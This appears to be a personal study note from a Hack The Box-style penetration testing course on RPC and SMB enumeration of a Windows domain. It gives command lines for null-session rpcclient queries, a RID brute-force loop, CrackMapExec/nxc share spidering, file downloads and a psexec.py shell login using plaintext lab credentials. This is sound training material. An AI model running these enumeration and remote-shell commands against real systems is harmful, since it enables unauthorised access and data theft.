

While looking at users in rpcclient, you may notice a field called `rid:` beside each user. A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:

- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
- So the domain user `htb-student` with a RID:[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.


we discuss how to enumerate a machine using RPC. Apart from enumeration, we can use RPC to make changes to the system, such as:

- Change a user's password.
- Create a new domain user.
- Create a new shared folder.

Keep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) from the SANS Institute to explore this further.

## rpc Tool
---------------------

rpc anonymouse session
```shell-session
$ rpcclient -U "" 10.129.14.128
```


| Query                        | Description                                                        |
| ---------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                    | Server information.                                                |
| `enumdomains`                | Enumerate all domains that are deployed in the network.            |
| `querydominfo`               | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`            | Enumerates all available shares.                                   |
| `netsharegetinfo <share>`    | Provides information about a specific share.                       |
| `enumdomusers`               | Enumerates all domain users.                                       |
| `queryuser <RID>`            | Provides information about a specific user.                        |
| `queryusergroups <user-RID>` | get the groups for user                                            |
| `querygroup <group-RID>`     | information about the group that the user is associated with       |


## Tools using rpc
query user:
```shell-session
rpcclient $> queryuser 0x457
```

psexec.py imapacket
```bash
# start shell
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

### using `samrdump.py`
------------------------------
```
 samrdump.py 10.129.14.128
```

The information we have already obtained with `rpcclient` can also be obtained using other tools. For example, the [SMBMap](https://github.com/ShawnDEvans/smbmap) and [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) tools are also widely used and helpful for the enumeration of SMB services.

### Enumerate SMB with smbmap & CME
---------------
``` title:smbmap
smbmap -H #ip 
```
download file
```
[★]$ smbmap -H 10.129.46.55 -s sambashare --download /sambashare/flag.txt
```

``` title:crackmapexec-smb
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```

# Discovering Users with RID bruteforce
-----
```shell-session
$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
## rid bruteforce with nxc
-----------
```
nxc smb ip -u 'guest' -p '' --rid-brute
```
## rid bruteforce using crackmap
```
crackmapexec smb 10.10.11.35 -u 'anonmyous' -p '' --rid-brute
```
![](security/Screenshots/Pasted%20image%2020241216175542.png)

 listing a share's content smbmap`
```
$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

 `spider a share cme `
```shell-session
$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'


OUTPUT: /tmp/cme_spider_plus

```

`command to clean spider results`
![mce](security/CPTS/OSINT/Screenshotsin/Pasted%20image%2020250116192022.png)

` listing a share's content smbmap`
```
$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

# download files

Download config file:
```
smbclient “//172.16.7.3/Department Shares” -U “inlanefreight\BR086”

cd IT/Private/Development

get web.config
```

![](security/CPTS/OSINT/Screenshotsin/Pasted%20image%2020250207193319.png)
We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller.
```shell-session
$ rpcclient -U'%' 10.10.110.17
```

```shell
 $> enumdomusers
 
user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
```

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:
- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

```shell-session
$ ./enum4linux-ng.py 10.10.11.45 -A -C
```
